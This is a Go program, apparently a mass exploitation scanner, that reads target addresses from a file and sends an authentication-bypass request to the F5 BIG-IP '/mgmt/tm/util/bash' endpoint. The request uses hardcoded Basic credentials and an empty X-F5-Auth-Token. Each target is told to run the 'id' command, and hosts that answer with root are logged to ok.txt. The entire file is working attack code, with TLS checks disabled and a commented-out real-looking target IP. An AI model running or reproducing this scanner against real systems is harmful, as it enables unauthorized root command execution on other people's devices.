/*
文件内容http://或https://为开头，不是一以此开头的可自行修改代码
本程序为多线程批处理，处理文件名，在代码中修改（有点懒）
*/
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	timeout = time.Second * 5
	tr = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
)
func wite(url string){//创建并写入文件夹
	f, err := os.OpenFile("ok.txt", os.O_APPEND, 0666)
	if err != nil{
		_, err = os.Create("ok.txt")
		return
	}
	_, err =io.WriteString(f, url + "\n")


}
func Http(url string){post := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	var jsonstr = []byte(post)
	buffer := bytes.NewBuffer(jsonstr)
	client := &http.Client{}
	request, err1 := http.NewRequest("POST",url + "/mgmt/tm/util/bash", buffer)
	request.Header.Set("Authorization", "Basic YWRtaW46QVNhc1M=")
	request.Header.Set("X-F5-Auth-Token", "")
	request.Header.Set("Content-Type", "application/json")
	if err1 != nil {
		fmt.Println(url + "   >>>   请求失败")
		return
	}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(url + "   >>>   不存在漏洞")
		return
	}
	defer response.Body.Close()
	body, _ := ioutil.ReadAll(response.Body)
	ret := regexp.MustCompile(`uid=0\(root\)`)
	alls := ret.FindAllString(string(body), -1)
	if alls != nil {
		fmt.Println(url+ "   >>>   " + alls[0])
		wite(url)
	}else{
		fmt.Println(url + "   >>>   不存在漏洞")
	}
}

func Https(url string){
	post := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	var jsonstr = []byte(post)
	buffer := bytes.NewBuffer(jsonstr)
	client := &http.Client{Transport: tr, Timeout: timeout}
	request, err := http.NewRequest("POST",url + "/mgmt/tm/util/bash", buffer)
	request.Header.Set("Authorization", "Basic YWRtaW46QVNhc1M=")
	request.Header.Set("X-F5-Auth-Token", "")
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println(url + "   >>>   请求失败")
		return
	}
	response, err1 := client.Do(request)
	if err1 != nil {
		fmt.Println(url + "   >>>   不存在漏洞")
		return
	}
	defer response.Body.Close()
	body, _ := ioutil.ReadAll(response.Body)
	ret := regexp.MustCompile(`uid=0\(root\)`)
	alls := ret.FindAllString(string(body), -1)
	if alls != nil {
		fmt.Println(url+ "   >>>   " + alls[0])
		wite(url)
	}else{
		fmt.Println(url + "   >>>   不存在漏洞")
	}
}
func Url(url <- chan string, wg *sync.WaitGroup){
	for url := range url{
		if !strings.HasPrefix(url, "https"){
			Http(url)
		}else{
			Https(url)
		}
	}
	wg.Done()
}
func main(){
	//Url("https://120.117.3.108")
	max := runtime.NumCPU() * 5
	var wg sync.WaitGroup
	wg.Add(max)
	ch := make(chan string)
	for i := 0; i < max; i++{
		go Url(ch, &wg)
	}
	file, _ := os.Open("ip.txt")
	defer file.Close()
	buf := bufio.NewScanner(file)
	for buf.Scan(){
		ch <- buf.Text()
	}
	close(ch)
	wg.Wait()
}
